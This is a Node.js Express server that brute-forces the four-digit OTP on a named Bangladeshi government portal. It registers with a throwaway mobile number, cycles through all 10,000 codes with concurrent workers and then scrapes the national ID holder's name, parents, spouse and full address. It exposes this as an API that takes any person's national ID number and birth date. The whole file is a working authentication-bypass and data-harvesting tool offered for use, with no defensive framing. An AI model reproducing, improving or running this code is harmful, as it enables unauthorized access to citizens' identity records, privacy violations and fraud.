const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { EventEmitter } = require('events');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Configuration
const MOBILE_PREFIX = "019";
const MAX_CONCURRENT = 30; // ভার্চুয়াল মেশিনের জন্য অপটিমাম
const TIMEOUT = 120000; // 2 মিনিট - 10,000 OTP চেক করার জন্য
const BATCH_SIZE = 500; // প্রতি বারে চেক
const TARGET_LOCATION = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";

// Simplified headers for speed
const BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Accept': '*/*',
    'Accept-Language': 'bn-BD,bn;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
};

// Create a connection pool
const httpsAgent = new require('https').Agent({ 
    keepAlive: true,
    maxSockets: MAX_CONCURRENT * 2,
    maxFreeSockets: 10,
    timeout: 60000
});

// Axios instance with connection pool
const axiosInstance = axios.create({
    httpsAgent,
    timeout: 8000,
    maxRedirects: 0,
    validateStatus: null,
    maxContentLength: Infinity,
    maxBodyLength: Infinity
});

// Helpers
function randomMobile(prefix) {
    return prefix + Math.random().toString().slice(2, 10);
}

function randomPassword() {
    const uppercase = String.fromCharCode(65 + Math.floor(Math.random() * 26));
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let randomChars = '';
    for (let i = 0; i < 8; i++) randomChars += chars.charAt(Math.floor(Math.random() * chars.length));
    return "#" + uppercase + randomChars;
}

// Generate all 10,000 OTPs in optimized batches
function* generateOTPBatches(batchSize = 100) {
    const total = 10000;
    for (let i = 0; i < total; i += batchSize) {
        const batch = [];
        for (let j = 0; j < batchSize && (i + j) < total; j++) {
            batch.push((i + j).toString().padStart(4, '0'));
        }
        yield batch;
    }
}

// Session creation
async function getSessionAndBypass(nid, dob, mobile, password) {
    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor';
    
    const headers = {
        ...BASE_HEADERS,
        'Origin': 'https://fsmms.dgf.gov.bd',
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor'
    };
    
    const params = new URLSearchParams();
    params.append('nidNumber', nid);
    params.append('email', '');
    params.append('mobileNo', mobile);
    params.append('dateOfBirth', dob);
    params.append('password', password);
    params.append('confirm_password', password);
    params.append('next1', '');

    const response = await axiosInstance.post(url, params.toString(), { headers });
    
    if (response.status === 302 && response.headers.location && response.headers.location.includes('mov-verification')) {
        const cookies = response.headers['set-cookie'] || [];
        return { 
            session: axiosInstance,
            cookies: cookies.map(cookie => cookie.split(';')[0])
        };
    }
    
    throw new Error('Session creation failed');
}

// Optimized OTP brute force with batch processing
async function bruteForceOTP(session, cookies) {
    console.log('🔍 Starting full OTP brute force (10,000 codes)...');
    
    const eventEmitter = new EventEmitter();
    let foundOTP = null;
    let processed = 0;
    let activeWorkers = 0;
    const startTime = Date.now();
    
    // Progress reporting
    const progressInterval = setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rate = processed / elapsed;
        const remaining = (10000 - processed) / rate;
        console.log(`📊 Progress: ${processed}/10000 (${(processed/100).toFixed(1)}%) - Rate: ${rate.toFixed(1)} OTP/s - ETA: ${remaining.toFixed(1)}s`);
    }, 5000);
    
    // Worker function
    const worker = async (workerId) => {
        while (!foundOTP && processed < 10000) {
            const currentIndex = processed++;
            if (currentIndex >= 10000) break;
            
            const otp = currentIndex.toString().padStart(4, '0');
            
            try {
                const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
                const headers = {
                    ...BASE_HEADERS,
                    'Cookie': cookies.join('; '),
                    'Origin': 'https://fsmms.dgf.gov.bd',
                    'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
                };
                
                const params = new URLSearchParams();
                params.append('otpDigit1', otp[0]);
                params.append('otpDigit2', otp[1]);
                params.append('otpDigit3', otp[2]);
                params.append('otpDigit4', otp[3]);
                
                const response = await session.post(url, params.toString(), { 
                    headers,
                    timeout: 3000
                });
                
                if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
                    foundOTP = otp;
                    eventEmitter.emit('found', otp);
                    console.log(`🎉 Worker ${workerId} found OTP: ${otp} at index ${currentIndex}`);
                    break;
                }
                
                // Rate limiting protection
                if (currentIndex % 100 === 0) {
                    await new Promise(resolve => setTimeout(resolve, 50));
                }
                
            } catch (error) {
                // Silent retry - decrement counter to retry this OTP
                processed--;
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        }
    };
    
    return new Promise((resolve, reject) => {
        eventEmitter.once('found', (otp) => {
            clearInterval(progressInterval);
            console.log(`✅ OTP found in ${(Date.now() - startTime)/1000}s: ${otp}`);
            resolve(otp);
        });
        
        // Start all workers
        const workers = [];
        for (let i = 0; i < MAX_CONCURRENT; i++) {
            workers.push(worker(i + 1));
        }
        
        // Set timeout
        setTimeout(() => {
            if (!foundOTP) {
                clearInterval(progressInterval);
                console.log(`⏰ Timeout after ${TIMEOUT/1000}s - Processed ${processed}/10000 OTPs`);
                resolve(null);
            }
        }, TIMEOUT);
        
        // Wait for all workers or OTP found
        Promise.all(workers).then(() => {
            if (!foundOTP) {
                clearInterval(progressInterval);
                console.log(`❌ No OTP found after processing all 10,000 codes`);
                resolve(null);
            }
        }).catch(reject);
    });
}

// Alternative: Sequential batch processing (more reliable)
async function bruteForceOTPBatch(session, cookies) {
    console.log('🔍 Starting batch OTP brute force...');
    
    let foundOTP = null;
    let processed = 0;
    const startTime = Date.now();
    
    // Process in batches
    for (let batchStart = 0; batchStart < 10000 && !foundOTP; batchStart += BATCH_SIZE) {
        const batchEnd = Math.min(batchStart + BATCH_SIZE, 10000);
        console.log(`🔄 Processing batch ${batchStart}-${batchEnd-1}...`);
        
        const batchPromises = [];
        
        for (let i = batchStart; i < batchEnd; i++) {
            const otp = i.toString().padStart(4, '0');
            
            batchPromises.push((async () => {
                try {
                    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
                    const headers = {
                        ...BASE_HEADERS,
                        'Cookie': cookies.join('; '),
                        'Origin': 'https://fsmms.dgf.gov.bd',
                        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
                    };
                    
                    const params = new URLSearchParams();
                    params.append('otpDigit1', otp[0]);
                    params.append('otpDigit2', otp[1]);
                    params.append('otpDigit3', otp[2]);
                    params.append('otpDigit4', otp[3]);
                    
                    const response = await session.post(url, params.toString(), { 
                        headers,
                        timeout: 5000
                    });
                    
                    if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
                        return otp;
                    }
                } catch (error) {
                    // Ignore individual errors
                }
                return null;
            })());
        }
        
        // Wait for current batch
        const results = await Promise.all(batchPromises);
        processed += BATCH_SIZE;
        
        // Check if any OTP was found
        for (const result of results) {
            if (result) {
                foundOTP = result;
                break;
            }
        }
        
        // Report progress
        const elapsed = (Date.now() - startTime) / 1000;
        console.log(`📊 Progress: ${processed}/10000 (${(processed/100).toFixed(1)}%) - Time: ${elapsed.toFixed(1)}s`);
        
        // Small delay between batches
        if (!foundOTP && batchEnd < 10000) {
            await new Promise(resolve => setTimeout(resolve, 500));
        }
    }
    
    const totalTime = (Date.now() - startTime) / 1000;
    console.log(foundOTP ? `✅ OTP found: ${foundOTP} in ${totalTime}s` : `❌ No OTP found in ${totalTime}s`);
    
    return foundOTP;
}

// Ultra-fast brute force with connection reuse
async function ultraFastBruteForce(session, cookies) {
    console.log('⚡ Starting ultra-fast OTP brute force...');
    
    const controller = new AbortController();
    const signal = controller.signal;
    let foundOTP = null;
    let completed = 0;
    const startTime = Date.now();
    
    // Create reusable request configuration
    const baseConfig = {
        headers: {
            ...BASE_HEADERS,
            'Cookie': cookies.join('; '),
            'Origin': 'https://fsmms.dgf.gov.bd',
            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
        },
        timeout: 4000,
        signal
    };
    
    // Process all OTPs
    const processOTP = async (otp) => {
        try {
            const params = new URLSearchParams();
            params.append('otpDigit1', otp[0]);
            params.append('otpDigit2', otp[1]);
            params.append('otpDigit3', otp[2]);
            params.append('otpDigit4', otp[3]);
            
            const response = await session.post(
                'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step',
                params.toString(),
                baseConfig
            );
            
            completed++;
            
            if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
                return otp;
            }
        } catch (error) {
            if (error.name !== 'AbortError') {
                completed++;
            }
        }
        return null;
    };
    
    // Create all promises
    const promises = [];
    for (let i = 0; i < 10000; i++) {
        const otp = i.toString().padStart(4, '0');
        promises.push(processOTP(otp));
        
        // Control concurrency
        if (promises.length >= MAX_CONCURRENT * 10) {
            // Check results periodically
            const results = await Promise.all(promises);
            for (const result of results) {
                if (result) {
                    controller.abort();
                    return result;
                }
            }
            promises.length = 0;
            
            // Progress report
            if (completed % 1000 === 0) {
                const elapsed = (Date.now() - startTime) / 1000;
                console.log(`📊 Processed: ${completed}/10000 - Rate: ${(completed/elapsed).toFixed(1)} OTP/s`);
            }
        }
    }
    
    // Check remaining promises
    if (promises.length > 0) {
        const results = await Promise.all(promises);
        for (const result of results) {
            if (result) {
                return result;
            }
        }
    }
    
    return null;
}

// Fetch form data
async function fetchFormData(session, cookies) {
    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form';
    const headers = {
        ...BASE_HEADERS,
        'Cookie': cookies.join('; '),
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
    };
    
    const response = await session.get(url, { headers, timeout: 10000 });
    return response.data;
}

// Extract data from HTML
function extractNIDData(html, nid, dob) {
    // Extract name
    let name = '';
    const nameMatch = html.match(/<input[^>]*id="contractorName"[^>]*value="([^"]*)"/i) ||
                     html.match(/<input[^>]*name="contractorName"[^>]*value="([^"]*)"/i);
    if (nameMatch) name = nameMatch[1];
    
    // Extract other fields
    const fields = [
        'fatherName', 'motherName', 'spouseName',
        'nidPerDivision', 'nidPerDistrict', 'nidPerUpazila', 'nidPerUnion',
        'nidPerVillage', 'nidPerWard', 'nidPerZipCode', 'nidPerPostOffice',
        'nidPerHolding', 'nidPerMouza', 'nationality'
    ];
    
    const data = { nameBangla: name, nationalId: nid, dateOfBirth: dob };
    
    fields.forEach(field => {
        const regex = new RegExp(`name="${field}"[^>]*value="([^"]*)"`, 'i');
        const match = html.match(regex);
        data[field] = match ? match[1] : '';
    });
    
    // Construct addresses
    const addrParts = [];
    if (data.nidPerHolding) addrParts.push(`বাসা/হোল্ডিং: ${data.nidPerHolding}`);
    if (data.nidPerVillage) addrParts.push(`গ্রাম: ${data.nidPerVillage}`);
    if (data.nidPerMouza) addrParts.push(`মৌজা: ${data.nidPerMouza}`);
    if (data.nidPerUnion) addrParts.push(`ইউনিয়ন: ${data.nidPerUnion}`);
    if (data.nidPerWard) addrParts.push(`ওয়ার্ড: ${data.nidPerWard}`);
    if (data.nidPerPostOffice) addrParts.push(`ডাকঘর: ${data.nidPerPostOffice}`);
    if (data.nidPerZipCode) addrParts.push(`পোস্টকোড: ${data.nidPerZipCode}`);
    if (data.nidPerUpazila) addrParts.push(`উপজেলা: ${data.nidPerUpazila}`);
    if (data.nidPerDistrict) addrParts.push(`জেলা: ${data.nidPerDistrict}`);
    if (data.nidPerDivision) addrParts.push(`বিভাগ: ${data.nidPerDivision}`);
    
    const address = addrParts.join(', ');
    
    return {
        nameBangla: data.nameBangla,
        nationalId: nid,
        dateOfBirth: dob,
        fatherName: data.fatherName || '',
        motherName: data.motherName || '',
        spouseName: data.spouseName || '',
        birthPlace: data.nidPerDistrict || '',
        nationality: data.nationality || 'বাংলাদেশী',
        division: data.nidPerDivision || '',
        district: data.nidPerDistrict || '',
        upazila: data.nidPerUpazila || '',
        union: data.nidPerUnion || '',
        village: data.nidPerVillage || '',
        ward: data.nidPerWard || '',
        zip_code: data.nidPerZipCode || '',
        post_office: data.nidPerPostOffice || '',
        permanentAddress: address,
        presentAddress: address
    };
}

// API Routes
app.get('/', (req, res) => {
    res.json({
        message: 'Full OTP Brute Force API',
        status: 'active',
        endpoint: '/get-info?nid=NID&dob=YYYY-MM-DD',
        note: 'Processes all 10,000 OTPs - May take 60-120 seconds'
    });
});

app.get('/get-info', async (req, res) => {
    const requestStart = Date.now();
    
    try {
        const { nid, dob, method = 'batch' } = req.query;
        
        if (!nid || !dob) {
            return res.status(400).json({
                success: false,
                error: 'NID and DOB (YYYY-MM-DD) are required'
            });
        }
        
        console.log(`\n🚀 Starting full OTP brute force for NID: ${nid}`);
        
        // Generate credentials
        const password = randomPassword();
        const mobile = randomMobile(MOBILE_PREFIX);
        console.log(`📱 Credentials: Mobile=${mobile}, Password=${password}`);
        
        // Step 1: Create session
        console.log('🔐 Creating session...');
        const { session, cookies } = await getSessionAndBypass(nid, dob, mobile, password);
        console.log('✅ Session created');
        
        // Step 2: Brute force OTP
        console.log('🔑 Starting OTP brute force (10,000 codes)...');
        
        let foundOTP;
        switch (method) {
            case 'fast':
                foundOTP = await ultraFastBruteForce(session, cookies);
                break;
            case 'batch':
            default:
                foundOTP = await bruteForceOTPBatch(session, cookies);
                break;
        }
        
        if (!foundOTP) {
            const elapsed = Date.now() - requestStart;
            return res.status(404).json({
                success: false,
                error: 'No valid OTP found after checking all 10,000 codes',
                elapsedTime: `${elapsed}ms`,
                suggestion: 'Try again or verify NID/DOB'
            });
        }
        
        // Step 3: Fetch data
        console.log('📄 Fetching NID data...');
        const html = await fetchFormData(session, cookies);
        
        // Step 4: Extract and format data
        console.log('🔧 Processing data...');
        const nidData = extractNIDData(html, nid, dob);
        
        const totalTime = Date.now() - requestStart;
        
        console.log(`✅ Success! Total time: ${totalTime}ms`);
        
        res.json({
            success: true,
            data: nidData,
            metadata: {
                processingTime: `${totalTime}ms`,
                otpFound: foundOTP,
                mobileUsed: mobile,
                method: method,
                timestamp: new Date().toISOString()
            }
        });
        
    } catch (error) {
        console.error('❌ Error:', error.message);
        const elapsed = Date.now() - requestStart;
        
        if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
            return res.status(504).json({
                success: false,
                error: 'Request timeout - OTP brute force taking too long',
                elapsedTime: `${elapsed}ms`,
                suggestion: 'Try method=batch for more reliable results'
            });
        }
        
        res.status(500).json({
            success: false,
            error: error.message,
            elapsedTime: `${elapsed}ms`
        });
    }
});

app.get('/status', (req, res) => {
    res.json({
        status: 'running',
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        timestamp: new Date().toISOString()
    });
});

app.listen(PORT, () => {
    console.log(`🚀 Full OTP Brute Force API running on port ${PORT}`);
    console.log(`⚡ Max concurrent: ${MAX_CONCURRENT}`);
    console.log(`⏱️  Timeout: ${TIMEOUT}ms`);
    console.log(`🔗 Endpoint: http://localhost:${PORT}/get-info?nid=NID&dob=YYYY-MM-DD`);
    console.log(`📊 Batch method: http://localhost:${PORT}/get-info?nid=NID&dob=YYYY-MM-DD&method=batch`);
    console.log(`⚡ Fast method: http://localhost:${PORT}/get-info?nid=NID&dob=YYYY-MM-DD&method=fast`);
});
